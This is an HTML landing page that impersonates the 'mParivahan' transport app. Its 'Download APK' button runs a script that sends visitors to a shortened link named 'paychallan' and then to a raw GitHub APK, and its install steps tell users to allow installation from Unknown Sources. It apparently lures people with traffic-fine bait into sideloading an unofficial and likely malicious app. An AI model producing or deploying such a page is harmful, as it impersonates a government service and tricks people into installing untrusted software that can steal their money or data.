<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>NexGen mParivahan â€” Download</title>
  <meta name="description" content="Download and install M Parivahan." />
  <style>
    :root { --text:#0f172a; --muted:#64748b; --card:#ffffff; --bg:#ffffff; --green:#22c55e; }
    *{box-sizing:border-box}
    body{margin:0;background:var(--bg); color:var(--text); font-family: ui-sans-serif, system-ui, -apple-system, Segoe UI, Roboto, Ubuntu, Cantarell, Noto Sans, Arial;}

    .top{padding:24px 16px; background:#fff; color:#000;}
    .top-inner{max-width:980px; margin:0 auto; display:flex; gap:20px; align-items:center;}
    .logo{width:120px; height:120px; border-radius:50%; object-fit:cover}
    .brand h1{margin:0; font-size:56px; line-height:1; font-weight:900}
    .brand .tag{margin-top:8px; color:#111; opacity:.85; font-size:20px}
    .brand{display:flex; flex-direction:column}

    .cta-wrap{display:flex; justify-content:center; margin:22px 0 8px}
    .cta{display:inline-block; padding:18px 28px; background:var(--green); color:#052e16; text-decoration:none; font-weight:800; border-radius:999px; box-shadow:0 10px 18px rgba(16,185,129,.28); font-size:24px}

    .container{max-width:980px; margin:22px auto 0; padding:0 16px 40px}
    .card{background:var(--card); border-radius:18px; padding:22px 22px; box-shadow:0 8px 18px rgba(2,6,23,.08)}
    .card h4{margin:0 0 12px; color:#2563eb; font-size:28px}
    .card ol{margin:0; padding-left:22px; line-height:1.7; font-size:18px}

    .road-wrap{display:grid; place-items:center; padding:36px 0 66px}
    .road{width:180px}
  </style>
</head>
<body>
  <!-- Header -->
  <header class="top">
    <div class="top-inner">
      <img class="logo" src="logo.png" alt="NexGen mParivahan" />
      <div class="brand">
        <h1>NexGen mParivahan</h1>
        <div class="tag">One stop transport solution for citizen</div>
      </div>
    </div>
  </header>

  <!-- CTA (Download Button) -->
  <section class="cta-wrap">
    <a id="downloadBtn" class="cta" href="#">Download APK</a>
  </section>

  <!-- How to Install -->
  <main class="container">
    <div class="card">
      <h4>How to Install</h4>
      <ol>
        <li>Tap the <strong>Download APK</strong> button above.</li>
        <li>Once downloaded, open the file from your phoneâ€™s notifications or Downloads.</li>
        <li>If prompted, allow installation from <em>Unknown Sources</em>.</li>
        <li>Follow the on-screen instructions to finish installation.</li>
        <li>Open <strong>M Parivahan</strong> and enjoy ðŸŽ‰</li>
      </ol>
    </div>
  </main>

  <!-- Road footer -->
  <div class="road-wrap">
    <svg class="road" viewBox="0 0 160 200" fill="none" xmlns="http://www.w3.org/2000/svg">
      <path d="M20 10h120l20 180H0L20 10z" stroke="#c7d2fe" stroke-width="3" fill="none"/>
      <rect x="78" y="24" width="4" height="24" rx="2" fill="#93c5fd"/>
      <rect x="78" y="60" width="4" height="24" rx="2" fill="#93c5fd"/>
      <rect x="78" y="96" width="4" height="24" rx="2" fill="#93c5fd"/>
      <rect x="78" y="132" width="4" height="24" rx="2" fill="#93c5fd"/>
    </svg>
  </div>

  <!-- âœ… Smart Link Script -->
  <script>
    // 1) Preferred short link
    const SHORT_LINK = "https://yxbu02.short.gy/paychallan";
    // 2) Fallback to GitHub raw link
    const RAW_APK_LINK = "https://raw.githubusercontent.com/mParivahan1/s1/main/mParivahan.apk";
    // 3) Delay before fallback (milliseconds)
    const FALLBACK_DELAY = 2500;

    const btn = document.getElementById("downloadBtn");
    btn.href = SHORT_LINK;
    btn.rel = "noopener noreferrer";

    btn.addEventListener("click", function (e) {
      e.preventDefault();

      // Try the short link first
      try {
        window.location.assign(SHORT_LINK);
      } catch (err) {
        // Immediate fallback if short link fails
        window.location.assign(RAW_APK_LINK);
        return;
      }

      // If still on this page after the delay â†’ fallback
      setTimeout(() => {
        if (document.visibilityState === "visible") {
          window.location.assign(RAW_APK_LINK);
        }
      }, FALLBACK_DELAY);
    });
  </script>
</body>
</html>
